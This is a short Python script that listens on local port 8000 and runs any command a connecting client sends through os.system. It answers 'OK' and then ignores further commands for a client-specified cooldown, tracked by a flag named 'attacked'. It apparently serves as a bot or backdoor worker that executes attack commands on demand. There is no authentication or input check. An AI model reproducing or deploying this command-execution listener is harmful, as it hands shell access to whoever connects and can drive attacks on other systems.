import socket, os, threading, time

attacked = False

def main():
    global attacked
    sock = socket.socket()
    sock.bind(('127.0.0.1', 8000))
    sock.listen(10)
    print('READY! LISTENING CONNECTS')
    while 1:
        conn,addr = sock.accept()
        print('Recived connection from: %s:%s' % (addr[0], str(addr[1])))
        try:
            if not attacked:
                command = conn.recv(4096).decode('utf-8').split(';')
                print('Entered command: ' + command[0])
                os.system(command[0])
                conn.send(b'OK')
                conn.close()
                attacked = True
                threading.Thread(target=timer, args=(command[1],)).start()
            else:
                conn.send(b'NO')
                conn.close()
        except Exception as e: pass

def timer(sec):
    global attacked
    print('Started timer ' + str(sec))
    time.sleep(int(sec))
    attacked = False

if __name__ == '__main__':
    main()